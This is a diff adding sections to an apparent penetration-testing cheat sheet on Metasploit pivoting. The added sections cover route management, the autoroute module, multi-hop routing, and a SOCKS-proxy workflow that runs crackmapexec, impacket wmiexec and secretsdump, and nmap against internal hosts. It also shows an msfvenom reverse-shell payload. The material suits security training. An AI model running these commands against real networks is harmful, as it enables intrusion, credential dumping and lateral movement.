@@ -75,6 +75,40 @@ msf6 > route del 172.16.5.0/24 1
 msf6 > route flush
 ```
 
+## MSF Route Management
+
+Managing routes is central to multi-hop pivoting. The `route` command in the MSF console gives full control over the routing table.
+
+```
+# Add a route — subnet/mask, session ID:
+msf6 > route add 172.16.5.0/24 1
+msf6 > route add 192.168.10.0 255.255.255.0 2   # CIDR or mask notation both work
+
+# Print all active routes (shows subnet, mask, gateway session):
+msf6 > route print
+
+# Active Routing Table
+# ===================
+# Subnet             Netmask            Gateway
+# ------             -------            -------
+# 172.16.5.0         255.255.255.0      Session 1
+# 192.168.10.0       255.255.255.0      Session 2
+
+# Delete a specific route:
+msf6 > route del 172.16.5.0/24 1
+
+# Flush ALL routes (clean slate):
+msf6 > route flush
+
+# Routes persist only for the current MSF session — re-add after restart
+# To persist routes across MSF restarts, add to ~/.msf4/msfconsole.rc:
+# route add 172.16.5.0/24 1
+
+# Verify which session handles a route:
+msf6 > route print
+# Cross-reference with: sessions -l
+```
+
 ## socks_proxy — SOCKS Proxy for External Tools
 
 With routes established, the `socks_proxy` auxiliary module creates a SOCKS proxy server. External tools (nmap, proxychains) route through the Meterpreter session via this proxy.
@@ -130,6 +164,37 @@ xfreerdp /v:localhost:3389 /u:Administrator /p:'Password123!'
 curl http://localhost:8080
 ```
 
+## MSF AutoRoute for Automatic Routing
+
+The `post/multi/manage/autoroute` module can automatically enumerate and add routes based on what the Meterpreter session can see — no manual subnet specification required.
+
+```
+># Method 1: Auto-detect routes from the session's routing table
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+msf6 post(multi/manage/autoroute) > set CMD autoadd
+msf6 post(multi/manage/autoroute) > run
+# MSF reads the pivot's routing table and adds reachable subnets automatically
+
+# Method 2: Print current routes from the session
+msf6 post(multi/manage/autoroute) > set CMD print
+msf6 post(multi/manage/autoroute) > run
+
+# Method 3: Add a specific subnet
+msf6 post(multi/manage/autoroute) > set CMD add
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+msf6 post(multi/manage/autoroute) > set NETMASK /24
+msf6 post(multi/manage/autoroute) > run
+
+# Method 4: Delete a route via autoroute module
+msf6 post(multi/manage/autoroute) > set CMD delete
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+
+# Shortcut: run autoroute inline from Meterpreter:
+meterpreter > run post/multi/manage/autoroute CMD=autoadd
+```
+
 ## MSF Scanner Modules Through Routes
 
 With autoroute configured, any MSF auxiliary module targets the internal network directly — no proxychains needed.
@@ -182,6 +247,76 @@ set RHOST 172.16.5.25
 # reverse_tcp = target initiates, needs return path to your LHOST
 # reverse_tcp via autoroute: set LHOST to pivot's internal IP,
 #   portfwd the LHOST:LPORT back to attack box
+```
+
+## Multi-Hop Pivoting
+
+Chain Meterpreter sessions across multiple network segments by adding routes on each new pivot session.
+
+```
+># Layer 1: Pivot1 session (ID 1) — reaches 172.16.5.0/24
+msf6 > route add 172.16.5.0/24 1
+
+# Compromise Pivot2 (172.16.5.19) through the route
+# Pivot2 session opens as session ID 2
+
+# Layer 2: Add route to deeper network via Pivot2 session (ID 2)
+msf6 > route add 192.168.10.0/24 2
+
+# Now MSF can reach 192.168.10.0/24 through session 1 → session 2
+
+# View full routing table:
+msf6 > route print
+
+# Tip: start socks_proxy before starting second hop —
+# existing proxy will route through both layers
+```
+
+## Combining MSF Pivot with External Tools via Proxychains
+
+The SOCKS proxy created by `auxiliary/server/socks_proxy` exposes the MSF route table to any proxychains-compatible external tool.
+
+```
+# Full workflow: MSF route + SOCKS proxy + external tools
+
+# Step 1: Get Meterpreter session on pivot
+msf6 > sessions -l
+# Active sessions
+# ===============
+#   Id  Name  Type                     ...
+#   1         meterpreter x64/linux    ...
+
+# Step 2: Add autoroute to internal subnet
+msf6 > use post/multi/manage/autoroute
+msf6 post(autoroute) > set SESSION 1
+msf6 post(autoroute) > set CMD autoadd
+msf6 post(autoroute) > run
+
+# Step 3: Start SOCKS5 proxy
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(socks_proxy) > set SRVPORT 9050
+msf6 auxiliary(socks_proxy) > set VERSION 5
+msf6 auxiliary(socks_proxy) > run -j
+
+# Step 4: Configure proxychains
+# /etc/proxychains4.conf:
+# socks5  127.0.0.1  9050
+
+# Step 5: Use impacket, crackmapexec, evil-winrm through MSF proxy
+proxychains crackmapexec smb 172.16.5.0/24 -u Administrator -p 'Password123!'
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
+    CORP/Administrator:'Password123!'@172.16.5.19
+proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
+    CORP/Administrator:'Password123!'@172.16.5.19
+
+# Step 6: Nmap through MSF SOCKS proxy (TCP connect only)
+proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 172.16.5.0/24
+
+# Stop the SOCKS proxy job when done:
+msf6 > jobs -K
+# Or kill specific job:
+msf6 > jobs -l
+msf6 > kill 0
 ```
 
 ## Multi-Layer Pivoting
@@ -251,3 +386,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o pay
 
 # Execute on Windows → connects to pivot:1234 → attack box:8081
 ```
+
+## Resources
+
+- Metasploit Documentation — https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html
+- MSF post/multi/manage/autoroute — built-in, run `info post/multi/manage/autoroute`
+- MSF auxiliary/server/socks_proxy — built-in, run `info auxiliary/server/socks_proxy`
+- MITRE T1090 — Proxy
+- MITRE T1572 — Protocol Tunneling
+- MITRE T1021 — Remote Services
